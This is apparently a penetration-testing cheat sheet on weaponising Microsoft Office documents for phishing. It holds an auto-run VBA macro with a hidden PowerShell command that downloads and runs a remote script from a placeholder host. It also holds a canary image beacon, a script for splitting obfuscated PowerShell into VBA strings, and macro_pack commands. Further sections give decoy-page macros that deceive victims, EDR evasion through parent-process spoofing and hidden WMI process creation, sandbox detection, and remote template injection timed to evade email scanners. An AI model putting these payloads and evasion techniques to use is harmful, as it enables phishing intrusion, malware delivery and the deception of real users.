# Phishing - Office Documents

### Word canary image

A canary image is an image in a Word document that will, whenever the document
is opened in Microsoft `Word` or `libreoffice`, trigger a request to a remote
URL.

In a Capture The Flag scenario requiring phishing, a canary image can be used
to determine if the target is making use of Microsoft Word in order to pursue
Word related attacks (such as office documents with macros, etc.).

The process to create a canary image in a Word `.docx` document is as follow:
  - Insert tab -> Quick Part -> Field
  - Categories: "Links and References"
  - IncludePicture -> "File name or URL": `http://<IP>/canary.gif`

### Office documents with VBA macro

The [`OffensiveVBA`](https://github.com/S3cur3Th1sSh1t/OffensiveVBA) GitHub
repository centralizes a number of `VBA` code-snippets for code execution,
sandboxes detection, persistence, etc.

###### Automatic macros ("auto macros")

*General concept.*

A number of macro names are associated with automatic execution upon
realization of specific operations. The following macro names are associated
by `MS Office` applications to automatic execution:

| Application | Macro name | Triggering operation |
|-------------|------------|----------------------|
| `Word` | `AutoOpen` |	Opening of an existing document. |
| `Word` | `AutoExec` |	Upon start of `MS Word` or loading of a global template. |
| `Word` | `AutoNew` |	Creation of a new document. |
| `Word` | `AutoClose` |	Closing of a document. |
| `Word` | `AutoExit` |	Upon exit of `MS Word` or unloading a global template. |
| `Excel` | `Workbook_Open` | Opening of the workbook. |
| `Excel` | `Workbook_WindowResize(ByVal Wn As Excel.Window)` | Resizing of the window of a workbook. |
| `Excel` | `Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean)` | Before save of the workbook. |
| `Excel` | `Workbook_AfterSave(ByVal Success As Boolean)` | After save of the workbook. |
| `Excel` | `Workbook_BeforeClose(Cancel As Boolean)` | Before closing of the workbook. |
| `Excel` | `Workbook_BeforePrint(Cancel As Boolean)` | Before printing of the workbook. |
| `Excel` | `Workbook_NewSheet(ByVal Sh As Object)` | Creation of a new sheet. |
| `Excel` | `Workbook_SheetActivate(ByVal Sh As Object)` | Switching to a different sheet. |
| `Excel` | `Workbook_SheetSelectionChange(ByVal Sh As Object, ByVal Target As Range)` | Modification of a cell content. |
| `Excel` | `Workbook_SheetBeforeDoubleClick(ByVal Sh As Object, ByVal Target As Range, Cancel As Boolean)` | Before a double-click on a cell. |
| `Excel` | `Workbook_SheetBeforeRightClick(ByVal Sh As Object, ByVal Target As Range, Cancel As Boolean)` | Before a right-click on a cell. |

A more comprehension list of the `auto macros` supported by `Excel` can be
found in the official [Microsoft
documentation](https://docs.microsoft.com/fr-fr/office/vba/api/excel.workbook).

*Automatic macro example.*

The following `VBA` code execute the `Test` macro upon opening of the document
containing the macro in `MS Word` (with `AutoOpen`) and `MS Excel`
(with `Workbook_Open`):

```
'<OS_COMMAND> basic example to download and execute in memory a PowerShell script from a webserver: cmd /c powershell.exe -NoP -NoExit -W Hidden -Exec Bypass -c IEX (New-Object System.Net.Webclient).DownloadString('http://<IP>/<PS_SCRIPT>').

Sub Test()
   Dim code: code = "<OS_COMMAND>"
   Shell (code)
End Sub

Sub AutoOpen()
   Test
End Sub

Sub Workbook_Open()
   Test
End Sub
```

###### PowerShell code in VBA macro

The following Python script transforms a PowerShell command into a
multi-lines VBA string declaration. It is notably useful for long obfuscated PowerShell command that doesn't fit into a single line VBA string declaration.

As an example, the scripts produces the following output:

```bash
# input PowerShell example, produced by Invoke-Obfuscation: cmd.exe /c PoWeRSheLL -exeCUtI BYPASs -noEXIT -COmma  "\"[...]')"

s0 = "PoWeRSheLL -exeCUtI BYPASs -noEXIT -COmma  ""\""$(SEt-vArIabLe  'Ofs' '') \"" + [ST"
[...]
s98 = "Mspec[4,26,25]-jOin'')"""

cmdStr = "cmd.exe /c " & s0 & s1 & s2 & s3 & s4 & s5 & s6 & s7 & s8 & s9 & s10 & s11
[...]
cmdStr = cmdStr & s89 & s90 & s91 & s92 & s93 & s94 & s95 & s96 & s97 & s98
```

```python
powershell_file = r'<POWERSHELL_COMMAND_FILE>'

# Number of char to split the PowerShell command in
n = 80

with open(powershell_file, 'r') as f:
    file_content = f.read()
    print (file_content)
    substrings = [file_content[i:i+n] for i in range(0, len(file_content), n)]

    substring_index = 0
    for substring in substrings:
        if '"' in substring:
            substring = substring.replace('"', '""')
        if '\n' in substring:
            substring = substring.replace('\n', '')

        print (f'\ts{substring_index} = "{substring}"')
        substring_index = substring_index + 1

    concat_str = '\tcmdStr = "cmd.exe /c " & s0'
    if substring_index > 2:
        for i in range(1, substring_index - 1):
            if len(concat_str) > n:
                print (concat_str)
                concat_str = f'\tcmdStr = cmdStr & s{i}'
            else:
                concat_str = f'{concat_str} & s{i}'

    if substring_index > 1:
        concat_str = f'{concat_str} & s{substring_index - 1} & " # "" & :: "'

    print (concat_str)
```

###### Automated Office documents generation with macro_pack

[`macro_pack`](https://github.com/sevagas/macro_pack) is a Python script that
automatically obfuscate `VBA` macros and generate documents embedding macros. A
"community version" is open sourced and a "pro version", that includes
additional features, can be purchased.

The following output formats are supported by `macro_pack` (listed using
`macro_pack.exe --listformats`):
  - Office documents:
    - Excel: `.xlsm`
    - Excel 97: `.xls`
    - Word: `.docm`
    - Word 97: `.doc`
    - PowerPoint: `.pptm`
    - Microsoft Project: `.mpp`
    - Visio: `.vsdm`
    - Visio97: `.vsd`
    - Access: `.mdb`

  - `VB` formats:
    - Visual Basic Script: `.vbs`
    - HTML Application: `.hta`
    - Windows Script Component: `.sct`
    - Windows Script File: `.wsf`
    - XSLT Stylesheet: `.xsl`

  - Shortcuts / others formats:
    - Shell Link: `.lnk`
    - Groove Shortcut: `.glk`
    - Explorer Command File: `.scf`
    - URL Shortcut: `.url`
    - Settings Shortcut: `.SettingContent-ms`
    - MS Library: `.library-ms`
    - Setup Information: `.inf`
    - Excel Web Query: `.iqy`
    - (Pro version only) SYmbolic LinK: `.slk`
    - (Pro version only) Compressed HTML Help: `.chm`
    - Command line: `.cmd`
    - Visual Studio Project: `.csproj`

Note that `MS Office` applications must be installed for the corresponding
documents generation (`MS Word`, `MS Excel`, etc.).

```
# Generates a document incorporating the obfuscated VBA macro specified.
# The output document format will be automatically deducted by macro_pack from the given file extension.
macro_pack.exe -f "<VBA_TXT_FILE>" -o -G "<OUTPUT_FILE>"

# Opens the specified document, triggering AutoOpen / Workbook_Openuse macros. Useful for testing purposes.
macro_pack.exe --run "<FILE>"
```

###### Decoy document

The following `VBA` code snippets, from
[`MacroPhishing`](https://github.com/TheKevinWang/MacroPhishing), can be used
to increase credibility of the scenario enticing the targeted user to enable
the macro. The first page of the document, that can contain a message enticing
macro activation, will be replaced by the second page of the document, that
can be otherwise left hidden, upon activation of the macro. The second page can
match the original subject / purpose of the document. Additionally, the macro
automatically chooses not to save changes made to the document if the document
is closed without saving. This allows the document to remain in its original
state, with the first page being shown to the user and the second page hidden.

The following `VBA` code should be added to the main `VBA` auto-execute
function:

```
Option Explicit
Dim oAppClass As New oAppClass
Public Sub AutoOpen()
ActiveDocument.Sections(1).Range.Font.Hidden = False
Set page1 = Selection.GoTo(What:=1, Which:=2, Name:=1).Bookmarks("\Page").Range
page1.Delete
Set oAppClass.oApp = Word.Application
End Sub
```

A new class, called `oAppClass` should then be created and the following code
added to the class. The class can be freely renamed, as long as the
instantiation from the main `VBA` function (`Dim oAppClass As New oAppClass`)
is updated.

```
Option Explicit
Public WithEvents oApp As Word.Application
Private Sub oApp_DocumentBeforeClose(ByVal Doc As Document, Cancel As Boolean)
Cancel = True
Application.Quit SaveChanges:=wdDoNotSaveChanges
End Sub
```

###### Spoofing the parent process and command line

Some `Endpoint Detection and Response (EDR)` products may rely on processes
parent-child relationship to detect and eventually block malicious macro
executions. Monitoring the process creation calls can for instance be used to
detect `MS Office` applications spawning `cmd.exe` or `powershell.exe`.
Processes' command line may also be scrutinized for malicious behavior.

In order to bypass `EDR` products that may implement such detection and
blocking mechanism, a process can be created with a spoofed parent-process and
command line. The technique can be conducted as follow:

  - Creation of the process in a suspended state with a legitimate-looking
    parent process (such as `explorer.exe`) and a seemingly harmless command
    line. The `Win32`'s `CreateProcess` API indeed supports the specification
    of the parent process (parameter of type `STARTUPINFOEX`).

  - Modification of the command line in the created process's
    `Process Environment Block (PEB)` to the malicious command (which will the
    one actually executed).

  - Resume of the process.

`VBA` macros spawning a process with a spoofed parent and command line are
available in the
[`spoofing-office-macro`](https://github.com/christophetd/spoofing-office-macro)
GitHub repository.

Note that creation of a process in a suspended state can be identified as
a malicious indicator by security products.

Another approach to break the parent-child relationship between office products
and PowerShell / cmd.exe, can be to rely on the `Win32_Process` `WMI` class to
start the process. By doing so, the child process will appear to have been
started from `WmiPrvSE.exe` rather than an office product. The following `VBA`
code snippet start a process in an hidden window:

```
Const HIDDEN_WINDOW = 12

strComputer = "."
Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Set objStartup = objWMIService.Get("Win32_ProcessStartup")
Set objConfig = objStartup.SpawnInstance_
objConfig.ShowWindow = HIDDEN_WINDOW
Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
errReturn = objProcess.Create("<PROCESS_CLI>", null, objConfig, intProcessID)
```

###### Anti-sanboxes detection

The
[following `VBA` code-snippet](https://github.com/S3cur3Th1sSh1t/OffensiveVBA/blob/main/src/SandBoxEvasion/CheckDomain.vba)
detect if the code is executed on a  domain-joined computer, and exit if not.
It can be used to detect if the macro is being executed in a emulated
environment or sandboxe.

```
Sub CheckDomain()
On Error Resume Next
Set objRootDSE = GetObject("LDAP://RootDSE")
If Err.Number <> 0 Then
wscript.Quit
End If
On Error GoTo 0
End Sub
```

### Remote template injection

In order to avoid embedding `VBA` code in an office document and having
to send a file format supporting macro (such as `.doc` or `.docm`), a remote
template can be included in a regular `.docx` file. The remote template will
contain the (malicious) `VBA` code and will be injected upon opening of the
document in Office. In additions to making the file more resilient to static
analysis, relaying on a remote template can help circumvent some dynamic
analysis techniques. For instance, the template can be made available on the
remote server a few minutes after sending the document, so that eventual
(immediate) scanning performed by emails gateway do not access the `VBA` code.

As with any `VBA` macro, the execution of the macro contained in the template
is conditioned by the activation of the content by the user ("Enable content").
However, upon opening of the document, `HTTP` `OPTIONS`, `HEAD`, and `GET`
requests will be sent to the webserver hosting the remote template, even if the
macro are not enabled.

The generation process of a `DOCX` document with a remote template is as
follow:
  1. Creation of a regular `docx` document (with a template). Online templates
     available through Office can be used as a starting point.

  2. Changing of the `.docx` extension to `.zip`.

  3. Extraction of the resulting zip archive (using `7zip` for example).

  4. Modification of the `Target` attribute (of type `attachedTemplate`) in
     the `<DOC_NAME>\word\_rels\settings.xml.rels` file to point to the remote
     template.
     Example: `Target="http://<IP>:443/Doc-template_with_macro.dotm"`

  5. Saving of the modification in the `settings.xml.rels` file, rezipping of
     the files into a `.docx` (by zipping the subfolders and files in
     `<DOC_NAME>\` and not the folder directly).

--------------------------------------------------------------------------------

### References

https://github.com/sevagas/macro_pack

https://docs.microsoft.com/en-us/office/vba/word/concepts/customizing-word/auto-macros

https://docs.microsoft.com/fr-fr/office/vba/api/excel.workbook

https://www.excel-pratique.com/fr/vba/evenements_classeur

https://github.com/TheKevinWang/MacroPhishing

https://github.com/christophetd/spoofing-office-macro

https://www.youtube.com/watch?v=l8nkXCOYQC4

https://blog.xpnsec.com/how-to-argue-like-cobalt-strike/

https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa

http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html
